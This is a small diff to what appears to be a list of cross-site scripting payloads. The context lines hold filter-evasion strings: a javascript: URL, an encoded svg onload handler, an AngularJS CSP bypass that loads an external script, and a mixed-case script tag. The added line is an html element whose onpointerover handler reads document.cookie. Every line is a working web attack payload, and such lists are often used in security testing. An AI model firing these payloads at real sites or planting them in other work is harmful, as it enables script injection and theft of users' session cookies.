@@ -182,3 +182,4 @@ javascript​:alert’1’
 <svg+onload%3Dalert%26%230000000040+"1")> –
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script><div ng-app ng-csp><button ng-click="$event.target.ownerDocument.defaultView.alert(document.domain)">Click me</button></div>
 <​ScRipT 5-0*3+9/3=>prompt(1)<​/ScRipT giveanswerhere=?
+'><<html onpointerover​=alert(document.cookie) style=display:block>XSS</html>>
